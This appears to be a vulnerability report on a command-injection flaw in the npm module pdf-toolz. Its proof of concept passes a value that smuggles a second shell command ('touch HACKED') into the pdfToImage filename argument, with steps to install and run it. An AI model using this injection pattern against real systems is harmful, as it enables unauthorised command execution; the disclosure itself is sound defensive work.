# Description

The `pdf-toolz` module is vulnerable against `arbitrary command injection` due to the fact some `inputs` given by the `user` are unsafely processed and executed.

# POC

1. Create the following PoC file:

```js
// poc.js
var pdf = require('pdf-toolz/PDF2Image');
pdf.pdfToImage("a", "test; touch HACKED; #");

```
2. Check there aren't files called `HACKED` 
3. Execute the following commands in another terminal:

```bash
apt-get install graphicsmagick # Install the *gm* executable needed for the module
npm i pdf-toolz # Install affected module
node poc.js #  Run the PoC
```
4. Recheck the files: now `HACKED` has been created
